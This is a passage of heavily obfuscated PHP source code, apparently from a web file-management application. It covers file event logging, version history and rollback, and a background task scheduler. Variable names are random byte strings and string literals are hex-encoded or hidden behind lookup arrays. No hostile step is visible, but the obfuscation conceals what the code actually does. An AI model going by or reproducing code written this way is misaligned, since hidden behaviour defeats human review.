authTargetInfoMake($ô½Ü¦Ú°) { $«äƒöÒÉ =& $_SERVER[óó‹¸‚å]; $……âİ—Ô = array(); $¹ôãàƒå = array(); foreach ($ô½Ü¦Ú° as $É÷–˜µ) { if ($É÷–˜µ[$«äƒöÒÉ[411]] == SourceModel::TYPE_USER) { $……âİ—Ô[] = intval($É÷–˜µ[$«äƒöÒÉ[505]]); } else { if ($É÷–˜µ[$«äƒöÒÉ[411]] == SourceModel::TYPE_GROUP) { $¹ôãàƒå[] = intval($É÷–˜µ[$«äƒöÒÉ[505]]); } } } if ($……âİ—Ô) { $……âİ—Ô = Model($«äƒöÒÉ[513])->userListInfo($……âİ—Ô); } if ($¹ôãàƒå) { $™É¸áù = array($«äƒöÒÉ[1951] => array($«äƒöÒÉ[418], $¹ôãàƒå)); $¹ôãàƒå = Model($«äƒöÒÉ[522])->field($«äƒöÒÉ[2075])->where($™É¸áù)->select(); $¹ôãàƒå = array_to_keyvalue($¹ôãàƒå, $«äƒöÒÉ[1863]); } return array($«äƒöÒÉ[2076] => $……âİ—Ô, $«äƒöÒÉ[2077] => $¹ôãàƒå); } public function authInfo($÷½ËÒë) { $ÔÁéñ·ö =& $_SERVER[óó‹¸‚å]; if ($÷½ËÒë[$ÔÁéñ·ö[1967]]) { $Ä®¸Æ®» = Model($ÔÁéñ·ö[507])->listData($÷½ËÒë[$ÔÁéñ·ö[1967]]); if (!$Ä®¸Æ®») { return !1; $Ğ‰¶çƒê = Model($ÔÁéñ·ö[507])->listData(); $ñª¡Ì° = array_filter_by_field($Ğ‰¶çƒê, $ÔÁéñ·ö[413], $ÔÁéñ·ö[197]); return $ñª¡Ì°; } $Şµ„¤²¨ = array_field_key($Ä®¸Æ®», array($ÔÁéñ·ö[399], $ÔÁéñ·ö[32], $ÔÁéñ·ö[413], $ÔÁéñ·ö[1886], $ÔÁéñ·ö[1887])); $Şµ„¤²¨[$ÔÁéñ·ö[2078]] = $÷½ËÒë; return $Şµ„¤²¨; } else { return array($ÔÁéñ·ö[419] => 0, $ÔÁéñ·ö[1869] => $÷½ËÒë[$ÔÁéñ·ö[2023]], $ÔÁéñ·ö[420] => $ÔÁéñ·ö[12], $ÔÁéñ·ö[1886] => $ÔÁéñ·ö[2079]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\162\143\145\137\x65\x76\x65\156\164"; protected $dataAuto = array(array("\143\x72\145\141\164\145\124\x69\155\145", "\164\151\x6d\145", "\x69\156\163\145\x72\x74", "\x66\165\156\143\x74\151\157\156"), array("\144\x65\x73\x63", '', "\x69\156\x73\145\162\164\x2c\165\160\x64\141\x74\145\x2c\x73\145\x6c\145\143\164", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($½…”“¨”, $óƒœœ…ê, $ÔÓ·’ªŞ = '') { $ß„€Öò¨ =& $_SERVER[óó‹¸‚å]; if (!$this->eventSave) { return; } $Ãã—–­‰ = Model($ß„€Öò¨[1343])->sourceInfo($½…”“¨”); if (!$Ãã—–­‰) { return !1; } if ($this->isCacheEvent($Ãã—–­‰, $óƒœœ…ê)) { return; } if ($ÔÓ·’ªŞ && is_string($ÔÓ·’ªŞ)) { $ÔÓ·’ªŞ = array($ß„€Öò¨[1902] => $ÔÓ·’ªŞ); } $çÔôû»” = array($ß„€Öò¨[417] => $½…”“¨”, $ß„€Öò¨[2080] => $Ãã—–­‰[$ß„€Öò¨[432]], $ß„€Öò¨[2081] => $Ãã—–­‰[$ß„€Öò¨[32]], $ß„€Öò¨[519] => !empty($Ãã—–­‰[$ß„€Öò¨[519]]) ? $Ãã—–­‰[$ß„€Öò¨[519]] : $ß„€Öò¨[12], $ß„€Öò¨[1665] => USER_ID, $ß„€Öò¨[422] => $óƒœœ…ê, $ß„€Öò¨[1667] => $ÔÓ·’ªŞ); $this->addSystemLog($óƒœœ…ê, $çÔôû»”); unset($çÔôû»”[$ß„€Öò¨[2081]], $çÔôû»”[$ß„€Öò¨[519]]); return $this->add($çÔôû»”); } private function addSystemLog($·ğš•¶, $ìà´Ãì) { $÷Ÿ›ßû =& $_SERVER[óó‹¸‚å]; if ($·ğš•¶ == $÷Ÿ›ßû[2082]) { $·ğš•¶ = $ìà´Ãì[$÷Ÿ›ßû[453]][$÷Ÿ›ßû[2083]]; } else { if (in_array($·ğš•¶, array($÷Ÿ›ßû[1843], $÷Ÿ›ßû[2084]))) { $·ğš•¶ = $ìà´Ãì[$÷Ÿ›ßû[453]][$÷Ÿ›ßû[759]]; } } $èÀİ¸ª = array_merge($ìà´Ãì, array($÷Ÿ›ßû[2085] => $ìà´Ãì[$÷Ÿ›ßû[402]], $÷Ÿ›ßû[2086] => $ìà´Ãì[$÷Ÿ›ßû[2086]])); Hook::trigger($÷Ÿ›ßû[2087], $÷Ÿ›ßû[2088] . $·ğš•¶, $ìà´Ãì); Model($÷Ÿ›ßû[1807])->addLog($÷Ÿ›ßû[2088] . $·ğš•¶, $èÀİ¸ª); } private function isCacheEvent($éÙºÊêñ, $¯«ª‘ŠÌ) { if ($éÙºÊêñ[$_SERVER[óó‹¸‚å][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ãûôğÁ¯, $ƒ¥ŞôÄ­) { $ö‚Ÿğò =& $_SERVER[óó‹¸‚å]; $²´ƒ×‹ = Model($ö‚Ÿğò[1343])->sourceInfo($ãûôğÁ¯); $û·ıŠ’å = array($ö‚Ÿğò[2083] => $ƒ¥ŞôÄ­, $ö‚Ÿğò[32] => $²´ƒ×‹[$ö‚Ÿğò[32]]); return $this->addEvent($ãûôğÁ¯, $ö‚Ÿğò[2082], $û·ıŠ’å); } public function eventFileEdit($ƒÈì’‚) { $ã€öµÛƒ =& $_SERVER[óó‹¸‚å]; $Çœ©¸Ê = array($ã€öµÛƒ[2089] => $_SERVER[$ã€öµÛƒ[2090]], $ã€öµÛƒ[2091] => strtolower(ACTION)); if (isset($GLOBALS[$ã€öµÛƒ[7]][$ã€öµÛƒ[2092]])) { $Çœ©¸Ê[$ã€öµÛƒ[2092]] = $ã€öµÛƒ[88]; } return $this->addEvent($ƒÈì’‚, $ã€öµÛƒ[1833], $Çœ©¸Ê); } public function eventRecycle($ËÜ«Ãî, $ë×¤í¾ğ) { return $this->addEvent($ËÜ«Ãî, $_SERVER[óó‹¸‚å][2084], $ë×¤í¾ğ); } public function eventRemove($›¸›…­) { $×•‘Î…« =& $_SERVER[óó‹¸‚å]; $¥§¶ÇúÉ = Model($×•‘Î…«[1343])->sourceInfo($›¸›…­); $î“ÆÕ¿û = $¥§¶ÇúÉ[$×•‘Î…«[32]]; return $this->addEvent($¥§¶ÇúÉ[$×•‘Î…«[432]], $×•‘Î…«[1832], $î“ÆÕ¿û); } public function eventShare($’ÑÈËó, $ß›´²£É) { return $this->addEvent($’ÑÈËó, $_SERVER[óó‹¸‚å][1843], $ß›´²£É); } public function eventMove($ï´©¾–ö, $µªïó˜, $§çŠüÑŸ) { $û‹¤¹©³ =& $_SERVER[óó‹¸‚å]; $±Æƒ€‡ = Model($û‹¤¹©³[1343]); $æÂÖòçë = $±Æƒ€‡->sourceInfo($ï´©¾–ö); $¥€„ëÙ¨ = $±Æƒ€‡->sourceInfo($µªïó˜); $ÔÚÄ«–… = $±Æƒ€‡->sourceInfo($§çŠüÑŸ); $Ç¢ç³ãÖ = array($û‹¤¹©³[1167] => $µªïó˜, $û‹¤¹©³[2093] => $¥€„ëÙ¨[$û‹¤¹©³[32]], $û‹¤¹©³[2071] => !empty($¥€„ëÙ¨[$û‹¤¹©³[519]]) ? $¥€„ëÙ¨[$û‹¤¹©³[519]] : $û‹¤¹©³[12], $û‹¤¹©³[1168] => $§çŠüÑŸ, $û‹¤¹©³[2094] => $ÔÚÄ«–…[$û‹¤¹©³[32]], $û‹¤¹©³[2095] => !empty($ÔÚÄ«–…[$û‹¤¹©³[519]]) ? $ÔÚÄ«–…[$û‹¤¹©³[519]] : $û‹¤¹©³[12]); $this->addEvent($ï´©¾–ö, $û‹¤¹©³[557], $Ç¢ç³ãÖ); $æÂÖòçë = $±Æƒ€‡->sourceInfo($ï´©¾–ö); $Ç¢ç³ãÖ = array($û‹¤¹©³[402] => $æÂÖòçë[$û‹¤¹©³[402]], $û‹¤¹©³[32] => $æÂÖòçë[$û‹¤¹©³[32]]); $this->addEvent($µªïó˜, $û‹¤¹©³[2096], $Ç¢ç³ãÖ); } public function eventCopy($ŠÔ‹›Äï) { $this->eventCreate($ŠÔ‹›Äï, $_SERVER[óó‹¸‚å][555]); } public function eventRename($¢ª€ÈÕÉ, $Ù»Ÿ¤Ôœ, $Ãµˆ÷›Ò) { $Š‡–ù†» =& $_SERVER[óó‹¸‚å]; $ÜÈ´”´¦ = array($Š‡–ù†»[1167] => $Ù»Ÿ¤Ôœ, $Š‡–ù†»[1168] => $Ãµˆ÷›Ò); return $this->addEvent($¢ª€ÈÕÉ, $Š‡–ù†»[1358], $ÜÈ´”´¦); } public function eventAddComment($˜È…ˆí¸, $ŒÙå ö³) { return $this->addEvent($˜È…ˆí¸, $_SERVER[óó‹¸‚å][2097], $ŒÙå ö³); } public function eventAddDesc($”±Ğşê¹, $ïè”üª) { return $this->addEvent($”±Ğşê¹, $_SERVER[óó‹¸‚å][2098], $ïè”üª); } public function listBySource($•ıÅÎ ­) { $™åÔ¼·õ =& $_SERVER[óó‹¸‚å]; $äâÉè® = Model($™åÔ¼·õ[1343])->sourceInfo($•ıÅÎ ­); $Ğ“ªßñğ = array($™åÔ¼·õ[417] => $•ıÅÎ ­); if ($äâÉè®[$™åÔ¼·õ[410]] == $™åÔ¼·õ[88]) { $˜¶á¥È = Model($™åÔ¼·õ[1343])->listSearchChildren($•ıÅÎ ­, 20000); $˜¶á¥È[] = $•ıÅÎ ­ . $™åÔ¼·õ[378]; $Ğ“ªßñğ = array($™åÔ¼·õ[402] => array($™åÔ¼·õ[7], $˜¶á¥È)); } $‰•ƒÂÄ• = $this->where($Ğ“ªßñğ)->order($™åÔ¼·õ[2099])->selectPage(); if ($‰•ƒÂÄ•[$™åÔ¼·õ[366]][$™åÔ¼·õ[367]] == 0) { $‰•ƒÂÄ•[$™åÔ¼·õ[366]][$™åÔ¼·õ[367]] = 1; $‰•ƒÂÄ•[$™åÔ¼·õ[369]] = array(array($™åÔ¼·õ[417] => $•ıÅÎ ­, $™åÔ¼·õ[2080] => $äâÉè®[$™åÔ¼·õ[432]], $™åÔ¼·õ[1665] => $äâÉè®[$™åÔ¼·õ[454]], $™åÔ¼·õ[422] => $™åÔ¼·õ[2100], $™åÔ¼·õ[423] => $äâÉè®[$™åÔ¼·õ[200]], $™åÔ¼·õ[1667] => $™åÔ¼·õ[12])); } return $this->eventListParse($‰•ƒÂÄ•, $•ıÅÎ ­); } private function eventListParse($Ç‰ ÇÚ, $·´’È‡™) { $Û ñ˜»ñ =& $_SERVER[óó‹¸‚å]; $™¼¤öĞ = $Ç‰ ÇÚ[$Û ñ˜»ñ[369]]; $ËÄ½ƒî = array_to_keyvalue($™¼¤öĞ, $Û ñ˜»ñ[12], $Û ñ˜»ñ[402]); $á‰•ÊÖË = array_to_keyvalue($™¼¤öĞ, $Û ñ˜»ñ[12], $Û ñ˜»ñ[2086]); foreach ($™¼¤öĞ as $âÁ±ô™·) { $…‡Âô¬µ = $âÁ±ô™·[$Û ñ˜»ñ[453]]; if ($âÁ±ô™·[$Û ñ˜»ñ[33]] == $Û ñ˜»ñ[557] && isset($…‡Âô¬µ[$Û ñ˜»ñ[1167]])) { $ËÄ½ƒî[] = $…‡Âô¬µ[$Û ñ˜»ñ[1167]] . $Û ñ˜»ñ[12]; $ËÄ½ƒî[] = $…‡Âô¬µ[$Û ñ˜»ñ[1168]] . $Û ñ˜»ñ[12]; } if ($âÁ±ô™·[$Û ñ˜»ñ[33]] == $Û ñ˜»ñ[2096] && isset($…‡Âô¬µ[$Û ñ˜»ñ[402]])) { $ËÄ½ƒî[] = $…‡Âô¬µ[$Û ñ˜»ñ[402]] . $Û ñ˜»ñ[12]; } } $ËÄ½ƒî = array_merge($ËÄ½ƒî, $á‰•ÊÖË, array($·´’È‡™ . $Û ñ˜»ñ[12])); $ËÄ½ƒî = array_unique($ËÄ½ƒî); $ŒÄ©’¦ = array_unique(array_to_keyvalue($™¼¤öĞ, $Û ñ˜»ñ[12], $Û ñ˜»ñ[1674])); $çÔ–÷¼§ = Model($Û ñ˜»ñ[535])->userListInfo($ŒÄ©’¦); $äıÌ’É« = Model($Û ñ˜»ñ[829])->sourceListInfo($ËÄ½ƒî, !0); foreach ($™¼¤öĞ as &$âÁ±ô™·) { if ($âÁ±ô™·[$Û ñ˜»ñ[33]] == $Û ñ˜»ñ[557] && isset($âÁ±ô™·[$Û ñ˜»ñ[453]][$Û ñ˜»ñ[1167]])) { $âÁ±ô™·[$Û ñ˜»ñ[453]][$Û ñ˜»ñ[1167]] = $äıÌ’É«[$âÁ±ô™·[$Û ñ˜»ñ[453]][$Û ñ˜»ñ[1167]]]; $âÁ±ô™·[$Û ñ˜»ñ[453]][$Û ñ˜»ñ[1168]] = $äıÌ’É«[$âÁ±ô™·[$Û ñ˜»ñ[453]][$Û ñ˜»ñ[1168]]]; } if ($âÁ±ô™·[$Û ñ˜»ñ[33]] == $Û ñ˜»ñ[2096] && isset($âÁ±ô™·[$Û ñ˜»ñ[453]][$Û ñ˜»ñ[402]])) { $âÁ±ô™·[$Û ñ˜»ñ[453]][$Û ñ˜»ñ[402]] = $äıÌ’É«[$âÁ±ô™·[$Û ñ˜»ñ[453]][$Û ñ˜»ñ[402]]]; } $âÁ±ô™·[$Û ñ˜»ñ[86]] = $äıÌ’É«[$âÁ±ô™·[$Û ñ˜»ñ[402]]]; $âÁ±ô™·[$Û ñ˜»ñ[2101]] = $äıÌ’É«[$âÁ±ô™·[$Û ñ˜»ñ[2086]]]; if ($âÁ±ô™·[$Û ñ˜»ñ[33]] == $Û ñ˜»ñ[1832]) { $âÁ±ô™·[$Û ñ˜»ñ[2101]] = $âÁ±ô™·[$Û ñ˜»ñ[86]]; $âÁ±ô™·[$Û ñ˜»ñ[2086]] = $âÁ±ô™·[$Û ñ˜»ñ[2101]][$Û ñ˜»ñ[402]]; $âÁ±ô™·[$Û ñ˜»ñ[86]] = !1; $âÁ±ô™·[$Û ñ˜»ñ[402]] = $Û ñ˜»ñ[12]; } $âÁ±ô™·[$Û ñ˜»ñ[2031]] = $çÔ–÷¼§[$âÁ±ô™·[$Û ñ˜»ñ[1674]]]; } unset($âÁ±ô™·); $Ç‰ ÇÚ[$Û ñ˜»ñ[369]] = $™¼¤öĞ; return $Ç‰ ÇÚ; } public function removeBySource($”¢Ì•…˜) { $çŸáÍŸ = array($_SERVER[óó‹¸‚å][417] => $”¢Ì•…˜); $this->where($çŸáÍŸ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\162\x63\x65\137\150\151\x73\164\157\162\x79"; public function historyCount($¨ê³ñù) { $™ïÅÓÛ° =& $_SERVER[óó‹¸‚å]; if (!$¨ê³ñù) { return array(); } if (is_string($¨ê³ñù) || is_int($¨ê³ñù)) { $¨ê³ñù = array($¨ê³ñù); } $¬áäŸ‘‰ = array($™ïÅÓÛ°[402], $™ïÅÓÛ°[1896] => $™ïÅÓÛ°[500]); $ş°µ²­ƒ = array($™ïÅÓÛ°[402] => array($™ïÅÓÛ°[7], $¨ê³ñù)); $™ Œ†üà = $this->field($¬áäŸ‘‰)->where($ş°µ²­ƒ)->group($™ïÅÓÛ°[402])->select(); return array_to_keyvalue($™ Œ†üà, $™ïÅÓÛ°[402], $™ïÅÓÛ°[500]); } public function addHistory($³²‰û™ß, $¥ßğ³ ë = '') { $ıÁ°ãŸ =& $_SERVER[óó‹¸‚å]; $¤ñö—˜Ï = array($ıÁ°ãŸ[417] => $³²‰û™ß[$ıÁ°ãŸ[402]], $ıÁ°ãŸ[1665] => isset($³²‰û™ß[$ıÁ°ãŸ[456]]) ? $³²‰û™ß[$ıÁ°ãŸ[456]] : $³²‰û™ß[$ıÁ°ãŸ[454]], $ıÁ°ãŸ[469] => $³²‰û™ß[$ıÁ°ãŸ[468]], $ıÁ°ãŸ[585] => $³²‰û™ß[$ıÁ°ãŸ[76]], $ıÁ°ãŸ[2102] => $¥ßğ³ ë); if ($GLOBALS[$ıÁ°ãŸ[6]][$ıÁ°ãŸ[89]][$ıÁ°ãŸ[1225]] >= 1) { $this->historyAutoClear($¤ñö—˜Ï[$ıÁ°ãŸ[402]]); $this->add($¤ñö—˜Ï); } Hook::trigger($ıÁ°ãŸ[2103], $¤ñö—˜Ï); Model($ıÁ°ãŸ[2104])->eventFileEdit($³²‰û™ß[$ıÁ°ãŸ[402]]); } private function historyAutoClear($²£”ê˜å) { $¢Šâ­¶¼ =& $_SERVER[óó‹¸‚å]; $ñšÎ—¤ = Model($¢Šâ­¶¼[774])->get($¢Šâ­¶¼[1247]); $âõ¨ÇÌÕ = $GLOBALS[$¢Šâ­¶¼[6]][$¢Šâ­¶¼[89]][$¢Šâ­¶¼[1225]]; $±‚‘õÈÊ = $ñšÎ—¤ == $¢Šâ­¶¼[1248] ? min(5, $âõ¨ÇÌÕ) : $âõ¨ÇÌÕ; $±‚‘õÈÊ = $±‚‘õÈÊ <= 0 ? 0 : $±‚‘õÈÊ - 1; if ($±‚‘õÈÊ >= 500) { return; } $½‡²Œ¬ = array($¢Šâ­¶¼[417] => $²£”ê˜å); $¥Öó•Ï = $this->field($¢Šâ­¶¼[2105])->where($½‡²Œ¬)->order($¢Šâ­¶¼[2099])->select(); if (!$¥Öó•Ï || $±‚‘õÈÊ >= count($¥Öó•Ï)) { return; } $Éùâ›‰ = array_to_keyvalue($¥Öó•Ï, $¢Šâ­¶¼[12], $¢Šâ­¶¼[399]); $Éùâ›‰ = array_slice($Éùâ›‰, $±‚‘õÈÊ); $÷†òÊ•Õ = array_to_keyvalue($¥Öó•Ï, $¢Šâ­¶¼[12], $¢Šâ­¶¼[468]); $÷†òÊ•Õ = array_slice($÷†òÊ•Õ, $±‚‘õÈÊ); if (!$Éùâ›‰ || !$÷†òÊ•Õ) { return; } $½‡²Œ¬ = array($¢Šâ­¶¼[419] => array($¢Šâ­¶¼[7], $Éùâ›‰)); $this->where($½‡²Œ¬)->delete(); Model($¢Šâ­¶¼[471])->remove($÷†òÊ•Õ); } public function listData($õÍÇÛæõ) { $Œå˜¾˜¹ =& $_SERVER[óó‹¸‚å]; $Ÿô¼ÄÓç = array($Œå˜¾˜¹[417] => $õÍÇÛæõ); $ÑÛ¼å§° = $Œå˜¾˜¹[2106]; $ç¡…×˜š = $this->field($ÑÛ¼å§°)->where($Ÿô¼ÄÓç)->order($Œå˜¾˜¹[2099])->selectPage(); $this->_listAppendUser($ç¡…×˜š[$Œå˜¾˜¹[369]]); $ıÄÜïÏ¢ = Model($Œå˜¾˜¹[774])->get($Œå˜¾˜¹[1247]); $Èù¹‡É = 5; if ($ıÄÜïÏ¢ == $Œå˜¾˜¹[1248]) { $ç¡…×˜š[$Œå˜¾˜¹[369]] = array_slice($ç¡…×˜š[$Œå˜¾˜¹[369]], 0, $Èù¹‡É); $ç¡…×˜š[$Œå˜¾˜¹[366]] = array($Œå˜¾˜¹[2107] => 1, $Œå˜¾˜¹[2108] => 20, $Œå˜¾˜¹[2109] => 1, $Œå˜¾˜¹[2110] => count($ç¡…×˜š[$Œå˜¾˜¹[369]])); } return $ç¡…×˜š; } protected function _listAppendUser(&$Š”íİÄĞ) { $”ÍèœÕó =& $_SERVER[óó‹¸‚å]; $Êë§Ú‘‰ = array_to_keyvalue($Š”íİÄĞ, $”ÍèœÕó[12], $”ÍèœÕó[1674]); $ŒèÆô¸ = Model($”ÍèœÕó[535])->userListInfo($Êë§Ú‘‰); foreach ($Š”íİÄĞ as &$¶™…ØÆ¾) { $â¥şƒ ½ = $¶™…ØÆ¾[$”ÍèœÕó[1674]]; $¶™…ØÆ¾[$”ÍèœÕó[454]] = $ŒèÆô¸[$â¥şƒ ½] ? $ŒèÆô¸[$â¥şƒ ½] : !1; } unset($¶™…ØÆ¾); } public function fileInfo($¼ïáªÏ÷) { $™ º¿Êª =& $_SERVER[óó‹¸‚å]; $ìÖ…¨ñ² = $this->tablePrefix; $ò¼ìĞöñ = "{$ìÖ…¨ñ²}\x69\157\x5f\x66\151\x6c\145\40\x66\x69\154\145\163\x20\157\156\x20\146\151\x6c\145\163\56\x66\151\154\x65\111\104\x20\75\40\x68\151\163\164\157\162\x79\x2e\x66\x69\x6c\x65\x49\x44"; return $this->alias($™ º¿Êª[2111])->where(array($™ º¿Êª[419] => $¼ïáªÏ÷))->join($ò¼ìĞöñ, $™ º¿Êª[2112])->find(); } public function removeItem($î—öî©å) { $ø‘Ã°î” =& $_SERVER[óó‹¸‚å]; $Ã€ê˜Ğ¶ = array($ø‘Ã°î”[419] => $î—öî©å); $€Áğ‘”Ş = $this->where($Ã€ê˜Ğ¶)->find(); if ($€Áğ‘”Ş) { $ÖÈ°³â÷ = $this->where($Ã€ê˜Ğ¶)->delete(); Model($ø‘Ã°î”[471])->remove($€Áğ‘”Ş[$ø‘Ã°î”[468]]); return $ÖÈ°³â÷; } return !1; } public function removeBySource($ïÍãŒ) { $º€¶öı° =& $_SERVER[óó‹¸‚å]; if (!$ïÍãŒ) { return !1; } if (!is_array($ïÍãŒ)) { $ïÍãŒ = array($ïÍãŒ); } $Œè÷Æ¼¸ = array($º€¶öı°[417] => array($º€¶öı°[7], $ïÍãŒ)); $©Æó¡²æ = $this->field($º€¶öı°[469])->where($Œè÷Æ¼¸)->select(); if ($©Æó¡²æ) { $this->where($Œè÷Æ¼¸)->delete(); $ä§¶€™º = array_to_keyvalue($©Æó¡²æ, $º€¶öı°[12], $º€¶öı°[468]); Model($º€¶öı°[471])->remove($ä§¶€™º); } return !0; } public function setDetail($ÁˆÂØÁ¨, $øñŞ›†) { $Ÿ•»ˆ©· =& $_SERVER[óó‹¸‚å]; return $this->where(array($Ÿ•»ˆ©·[419] => $ÁˆÂØÁ¨))->save(array($Ÿ•»ˆ©·[2102] => $øñŞ›†)); } public function rollbackToItem($—¿¨³¦™, $›è±ª™ß) { $€íÚÎ =& $_SERVER[óó‹¸‚å]; $²¯Ş Çº = Model($€íÚÎ[829])->sourceInfo($—¿¨³¦™); $this->addHistory($²¯Ş Çº, LNG($€íÚÎ[2113])); $åúÒä× = $this->find($›è±ª™ß); $’ß¯†ü‹ = array($€íÚÎ[468] => $åúÒä×[$€íÚÎ[468]], $€íÚÎ[76] => $åúÒä×[$€íÚÎ[76]], $€íÚÎ[85] => time(), $€íÚÎ[456] => USER_ID); Model($€íÚÎ[829])->where(array($€íÚÎ[402] => $—¿¨³¦™))->save($’ß¯†ü‹); return $this->where(array($€íÚÎ[419] => $›è±ª™ß))->delete(); } public function clearSame($¾âáÓ¶Š) { $§ı´ÚºÙ =& $_SERVER[óó‹¸‚å]; $¤Ûñ¢é‘ = $this->listData($¾âáÓ¶Š); $»ŞÎÕ = array_to_keyvalue_group($¤Ûñ¢é‘, $§ı´ÚºÙ[468]); $·õ¼‚ = array(); $›†˜÷«Â = array(); foreach ($»ŞÎÕ as $¿ƒ‡òÁ¨) { if (!$¿ƒ‡òÁ¨ || count($¿ƒ‡òÁ¨) <= 1) { continue; } foreach ($¿ƒ‡òÁ¨ as $Ÿö˜¹) { $·õ¼‚[] = $Ÿö˜¹[$§ı´ÚºÙ[468]]; $›†˜÷«Â[] = $Ÿö˜¹[$§ı´ÚºÙ[399]]; } } if (!$›†˜÷«Â) { return; } $this->where(array($§ı´ÚºÙ[399] => array($§ı´ÚºÙ[7], $›†˜÷«Â)))->delete(); Model($§ı´ÚºÙ[471])->remove($·õ¼‚); } public function userSpace() { $ËõáÀí‰ =& $_SERVER[óó‹¸‚å]; $¬É–ìÏğ = $this->tablePrefix; $‹–ËÅ® = array($ËõáÀí‰[1665] => USER_ID); $½÷èôé = "{$¬É–ìÏğ}\x69\x6f\x5f\x66\151\x6c\x65\40\146\151\154\145\163\40\x6f\156\x20\x66\151\154\145\163\56\146\151\154\x65\x49\104\x20\75\40\150\151\163\x74\157\x72\x79\x2e\146\x69\154\x65\111\x44"; return $this->alias($ËõáÀí‰[2111])->where($‹–ËÅ®)->join($½÷èôé, $ËõáÀí‰[2112])->sum($ËõáÀí‰[76]); } } goto FÖÅôÁ’¿; DÃïŠ‚§ô»: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ıÌĞù´ =& $_SERVER[óó‹¸‚å]; if (self::valueGet($ıÌĞù´[754]) != $ıÌĞù´[88]) { return; } if (self::valueGet($ıÌĞù´[1633]) == $ıÌĞù´[88]) { $ŸÓü›ÔÉ = self::valueGet($ıÌĞù´[1634]); if (time() - $ŸÓü›ÔÉ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$ıÌĞù´[1635]] = 1; self::valueSet($ıÌĞù´[1633], $ıÌĞù´[88]); self::log($ıÌĞù´[1636] . ACTION . $ıÌĞù´[1637]); Session::$data = array(); Session::$sessionSign = $ıÌĞù´[12]; $GLOBALS[$ıÌĞù´[503]] = 1; Hook::bind($ıÌĞù´[1638], $ıÌĞù´[1639]); $€ú†µ˜Ü = 0; while (!0) { self::cacheClear(); if (self::valueGet($ıÌĞù´[754]) != $ıÌĞù´[88]) { self::valueSet($ıÌĞù´[1633], $ıÌĞù´[197]); self::log($ıÌĞù´[1640]); die; } $§æñäõ = time(); if ($§æñäõ - $€ú†µ˜Ü >= 60) { self::valueSet(array($ıÌĞù´[1633] => $ıÌĞù´[88], $ıÌĞù´[1634] => $§æñäõ), !1); $€ú†µ˜Ü = $§æñäõ; } if (!file_exists(USER_SYSTEM . $ıÌĞù´[1641])) { self::valueSet(array($ıÌĞù´[1633] => $ıÌĞù´[197], $ıÌĞù´[754] => $ıÌĞù´[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ó•åšÜ± =& $_SERVER[óó‹¸‚å]; http_close(); self::valueSet($ó•åšÜ±[754], $ó•åšÜ±[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ó•åšÜ±[1633] => $ó•åšÜ±[197], $ó•åšÜ±[754] => $ó•åšÜ±[88]), !1); } public static function taskSwitch() { $•Ò­©¬ =& $_SERVER[óó‹¸‚å]; $Ğ±²ì«á = self::valueGet($•Ò­©¬[754]) == $•Ò­©¬[88] ? $•Ò­©¬[197] : $•Ò­©¬[88]; self::valueSet($•Ò­©¬[754], $Ğ±²ì«á); } public static function shutdownEvent() { $¥­öâ Ø =& $_SERVER[óó‹¸‚å]; self::valueSet($¥­öâ Ø[1633], $¥­öâ Ø[197]); self::log($¥­öâ Ø[1642]); } public static function config($ ×¸õ²Ô, $ˆÈáá¶) { self::valueSet($_SERVER[óó‹¸‚å][754], $ ×¸õ²Ô); } private static function taskRunAll() { $Ù®¡Çé” =& $_SERVER[óó‹¸‚å]; $œû„¹ Ê = timeFloat(); $«‰ÓËÚƒ = Model($Ù®¡Çé”[1643])->listData(); $»ø¥´º‰ = count($«‰ÓËÚƒ); for ($£¡ê†¥ = 0; $£¡ê†¥ < $»ø¥´º‰; $£¡ê†¥++) { $Ïõ‘ı†µ = $«‰ÓËÚƒ[$£¡ê†¥]; if (!$Ïõ‘ı†µ[$Ù®¡Çé”[399]] || $Ïõ‘ı†µ[$Ù®¡Çé”[1644]] != $Ù®¡Çé”[88]) { continue; } if (!self::taskTimeCheck($Ïõ‘ı†µ)) { continue; } self::taskRun($Ïõ‘ı†µ); } Hook::trigger($Ù®¡Çé”[1645]); self::taskQueueRun($œû„¹ Ê); } private static function taskQueueRun($•±¯ß†) { $°áé”Ñ = 10; while (!0) { $Íş’Åï² = TaskQueue::run(); if ($Íş’Åï² === !1) { break; } if (timeFloat() - $•±¯ß† >= $°áé”Ñ) { break; } } } private static function taskTimeCheck($èÙÏš­ç) { $¤ˆÇ§®¹ =& $_SERVER[óó‹¸‚å]; $‚£¦Éã = json_decode($èÙÏš­ç[$¤ˆÇ§®¹[203]], !0); $°¼§ß×Ê = intval($èÙÏš­ç[$¤ˆÇ§®¹[1634]]); $úÄö¯î’ = strtotime($¤ˆÇ§®¹[1646] . $‚£¦Éã[$¤ˆÇ§®¹[1647]] . $¤ˆÇ§®¹[1648]) - strtotime($¤ˆÇ§®¹[1649]); $€¼¸§Ø¤ = time() - strtotime(date($¤ˆÇ§®¹[1650]) . $¤ˆÇ§®¹[1651]); $¢—·Ï™ˆ = $€¼¸§Ø¤ >= $úÄö¯î’ && $€¼¸§Ø¤ <= $úÄö¯î’ + 3600; switch ($‚£¦Éã[$¤ˆÇ§®¹[33]]) { case $¤ˆÇ§®¹[1652]: if (time() - $°¼§ß×Ê < 3600 * 24 * 30) { return !1; } if ($‚£¦Éã[$¤ˆÇ§®¹[1652]] == date($¤ˆÇ§®¹[1653]) && $¢—·Ï™ˆ) { return !0; } break; case $¤ˆÇ§®¹[1654]: if (time() - $°¼§ß×Ê < 3600 * 24 * 7) { return !1; } $¥ãü–¥ã = date($¤ˆÇ§®¹[1655]) == 0 ? 7 : date($¤ˆÇ§®¹[1655]); if ($‚£¦Éã[$¤ˆÇ§®¹[1654]] == $¥ãü–¥ã && $¢—·Ï™ˆ) { return !0; } break; case $¤ˆÇ§®¹[1647]: if (time() - $°¼§ß×Ê < 3600 * 24) { return !1; } if ($¢—·Ï™ˆ) { return !0; } break; case $¤ˆÇ§®¹[1656]: if (time() - $°¼§ß×Ê >= 